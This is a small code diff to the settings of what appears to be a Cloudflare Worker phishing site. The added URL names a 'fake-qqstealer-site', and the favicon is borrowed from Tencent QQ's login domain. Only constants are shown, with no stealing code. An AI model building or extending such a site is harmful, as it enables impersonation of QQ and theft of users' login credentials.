@@ -1,6 +1,6 @@
 const NOT_FOUND_RETURN = "";
 const DONT_USE_DEFAULT_404 = true;
-const BACKUP_404_URLS = new Array("https://d2lstatics.ml/assets/cfw-qq/404.html");
+const BACKUP_404_URLS = new Array("https://d2lghp.ml/cfworker-fake-qqstealer-site/404.html", "https://d2lstatics.ml/assets/cfw-qq/404.html");
 const REPORT_DATA = [];
 const FAVICON = "https://ssl.zc.qq.com/favicon.ico";
 const DEBUG = false;
